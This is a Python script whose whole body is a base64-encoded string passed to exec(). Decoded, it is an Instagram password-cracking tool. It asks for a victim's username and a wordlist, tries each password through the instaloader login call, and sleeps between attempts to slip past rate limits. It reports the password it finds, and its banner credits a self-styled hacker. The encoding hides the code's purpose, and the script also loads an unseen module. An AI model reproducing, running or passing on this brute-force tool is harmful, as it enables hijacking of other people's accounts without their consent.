import marshal,zlib,base64
exec (base64.b64decode("aW1wb3J0IG9zCmltcG9ydCBpbnN0YWxvYWRlcgpmcm9tIGdldHBhc3MgaW1wb3J0IGdldHBhc3MKaW1wb3J0IHRpbWUKaW1wb3J0IHN1YnByb2Nlc3MgYXMgc3ViCmltcG9ydCByYW5kb20KZnJvbSBpbnRybyBpbXBvcnQgKgoKY2xhc3MgYmNvbG9yczoKICAgIEJPTEQgPSAnXDAzM1sxbScKICAgIFBVUlBMRSA9ICdcMDMzWzk1bScKICAgIE9LQkxVRSA9ICdcMDMzWzk0bScKICAgIE9LR1JFRU4gPSAnXDAzM1s5NW0nCiAgICBXQVJOSU5HID0gJ1wwMzNbOTNtJwogICAgRkFJTCA9ICdcMDMzWzkxbScKICAgIEVOREMgPSAnXDAzM1swbScKICAgIFVOREVSTElORSA9ICdcMDMzWzRtJwpzdGFydCgpCmNvZGVMaXN0ID0gWyJUUiIsICJVUy1DIiwgIlVTIiwgIlVTLVciLCAiQ0EiLCAiQ0EtVyIsCiAgICAgICAgICAgICJGUiIsICJERSIsICJOTCIsICJOTyIsICJSTyIsICJDSCIsICJHQiIsICJISyJdCkwgPSBpbnN0YWxvYWRlci5JbnN0YWxvYWRlcigpCnZlcmlfYnJlYWsgPSAibm8iCgp3aGlsZSBUcnVlOgogICAgaWYgdmVyaV9icmVhayA9PSAic2kiOgogICAgICAgIGJyZWFrCiAgICBVU0VSID0gIiIKICAgIFVTRVIgPSBpbnB1dCgnXDAzM1sxbVwwMzNbOTJtXG5bP11FTlRFUiBJTlNUQUdSQU0gVVNFUk5BTUUgRk9SIENSQUNLIFBBU1NXT1JEOiAnKQogICAgd2wgPSBpbnB1dCgiXG5bP11FbnRlciB0aGUgUGFzc0xpc3QgYWxvbmcgVGhlIFBhdGg6ICIpCiAgICBzbGVlcHAgPSBpbnQoaW5wdXQoIlwwMzNbMW1cMDMzWzkxbVxuWyFdVHlwZSB0aGUgc2xlZXAgdGltZSBmb3IgbG9naW4oc2VjKSAoUmVjOjkwMCk6ICIpKQogICAgd2hpbGUgVHJ1ZToKICAgICAgICBzdWIuY2FsbCgiY2xlYXIiKQogICAgICAgIHByb2NlZGVyZSA9IGlucHV0KCJcMDMzWzk2bVvigKJdVXNlcm5hbWUgdG8gYnJ1dGVmb3JjZSA9ICIrYmNvbG9ycy5CT0xEK1VTRVIrIlxuXG5cMDMzWzk2bVvigKJdV29yZGxpc3QgPSAiK3dsKyJcblxuU2xlZXAgdGltZSA9ICIrc3RyKHNsZWVwcCkrYmNvbG9ycy5CT0xEKyJcblwwMzNbOTFtWyFdIENvbkZpcm0gICh5L24pOiAiK2Jjb2xvcnMuRU5EQykKICAgICAgICBpZiBwcm9jZWRlcmUgPT0gInkiOgogICAgICAgICAgICB2ZXJpX2JyZWFrID0gInNpIgogICAgICAgICAgICBicmVhawogICAgICAgIAogICAgICAgIGVsaWYgcHJvY2VkZXJlID09ICJuIjoKICAgICAgICAgICAgZXhpdCgpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcGFzcwoKCgpmaWxlMSA9IG9wZW4od2wsICdyJykKTGluZXMgPSBmaWxlMS5yZWFkbGluZXMoKSAKY291bnQgPSAwCm9zLnN5c3RlbSgiY2xlYXIiKQpwcmludCgiXHQgIFwwMzNbOTJtLiMjIyMjIyMjLiMjLi4uLi4jIy4uIyMjIyMjIy4uIyMjI1x0IikKcHJpbnQoIlx0ICBcMDMzWzkybS4uLi4uLiMjLi4jIy4uLi4uIyMuIyMuLi4uLiMjLi4jIy5cdCIpCnByaW50KCJcdCAgXDAzM1s5Mm0uLi4uLiMjLi4uIyMuLi4uLiMjLiMjLi4uLi4jIy4uIyMuXHQiKSAgICAgICAgICAgICAKcHJpbnQoIlx0ICBcMDMzWzkybS4uLi4jIy4uLi4jIyMjIyMjIyMuIyMuLi4uLiMjLi4jIy5cdCIpCnByaW50KCJcdCAgXDAzM1s5Mm0uLi4jIy4uLi4uIyMuLi4uLiMjLiMjLi4uLi4jIy4uIyMuXHQiKQpwcmludCgiXHQgIFwwMzNbOTJtLi4jIy4uLi4uLiMjLi4uLi4jIy4jIy4uLi4uIyMuLiMjLlx0IikKcHJpbnQoIlx0ICBcMDMzWzkybS4jIyMjIyMjIy4jIy4uLi4uIyMuLiMjIyMjIyMuLiMjIyNcdCIpCnByaW50KCIiKQpwcmludCgiXHQgXDMzWzk0beKKsOGvveKKseKUiOKUgOKUgOKVjOKdiiBDT0RFRCBCWSBTNzRSSyDinYrilYzilIDilIDilIjiirDhr73iirEgXHQiKQpwcmludCgiIikKcHJpbnQoIlx0ICBcMDMzWzM2beKUj+KUgeKUgeKUgeKUgeKUgcKw4p2A4oCiwrA68J+OgCAtIPCfjoA6wrDigKLinYDCsOKUgeKUgeKUgeKUgeKUgeKUk1x0IikKcHJpbnQoIlxuXHQgICBcMDMzWzkzbVsjXSBcMDMzWzk0bUFVVEhPUiAgIDogIFwwMzNbOTJtQ1lCM1ItJDc0UksgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFx0ICIpCnByaW50KCJcdCAgXDAzM1s5M20gWyNdIFwwMzNbOTRtR0lUSFVCICA6IFwwMzNbOTJtZ2l0aHViLmNvbS9DWUJFUi1TVEFSSyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFx0ICAiKQpwcmludCgiXHQgIFwwMzNbOTNtIFsjXSBcMDMzWzk0bUlOU1RBICA6IFwwMzNbOTJtY3liZXJfc3Q0cmsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFx0IikKcHJpbnQoIlx0ICBcMDMzWzM2beKUl+KUgeKUgeKUgeKUgeKUgcKw4p2A4oCiwrA68J+OgCAtIPCfjoA6wrDigKLinYDCsOKUgeKUgeKUgeKUgeKUgeKUm1x0IikKCgpmb3IgbGluZSBpbiBMaW5lczoKICAgIHRyeToKICAgICAgICBQQVNTV09SRCA9ICIiCiAgICAgICAgY291bnQgKz0gMQogICAgICAgIHBzdGVzdCA9ICgie30iLmZvcm1hdChsaW5lLnN0cmlwKCkpKQogICAgICAgIFBBU1NXT1JEID0gcHN0ZXN0CiAgICAgICAgY2hvaWNlQ29kZSA9IHJhbmRvbS5jaG9pY2UoY29kZUxpc3QpCiAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgIHByaW50KCJcblwwMzNbOTRtVHJ5aW5nICIrcHN0ZXN0KyIuLi4iK2Jjb2xvcnMuUFVSUExFKQogICAgICAgIEwubG9naW4oVVNFUiAsIFBBU1NXT1JEKQogICAgICAgIHByaW50KCJcblwwMzNbMzZtW+Kck11QYXNzd29yZCBmb3VuZDogICAgXDAzM1s5Mm0iK3BzdGVzdCkKICAgICAgICAKICAgICAgICBicmVhawogICAgZXhjZXB0IGluc3RhbG9hZGVyLmV4Y2VwdGlvbnMuQmFkQ3JlZGVudGlhbHNFeGNlcHRpb246CiAgICAgICAgcGFzcwogICAgICAgIHByaW50KGJjb2xvcnMuRkFJTCsiXDAzM1s5MW1bIV0gSW5jb3JyZXQgcGFzc3dvcmQ6ICIrcHN0ZXN0KQogICAgICAgIHByaW50KCJcMDMzWzkzbXNsZWVwIGZvciAiKyBzdHIoc2xlZXBwKSkKICAgICAgICB0aW1lLnNsZWVwKHNsZWVwcCkKCiAgICBleGNlcHQgaW5zdGFsb2FkZXIuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXhjZXB0aW9uOgogICAgICAgIHByaW50KGJjb2xvcnMuRkFJTCsiXG5cMDMzWzkxbVshXSBJbnN0YWdyYW0gaGFzIGJlZW4gcmVxdWVzdGVkIHZlcmlmaWNhdGlvbiB2aWEgc21zLCB0cnkgdG8gc2V0IG1vcmUgbG9naW4gdGltZS4uLiIpCiAgICAgICAgYnJlYWsKCiAgICBleGNlcHQgaW5zdGFsb2FkZXIuZXhjZXB0aW9ucy5JbnZhbGlkQXJndW1lbnRFeGNlcHRpb246CiAgICAgICAgcHJpbnQoYmNvbG9ycy5GQUlMKyJcblwwMzNbOTFtW+KYuV0gVXNlcm5hbWUgbm90IGZvdW5kIikKCg=="))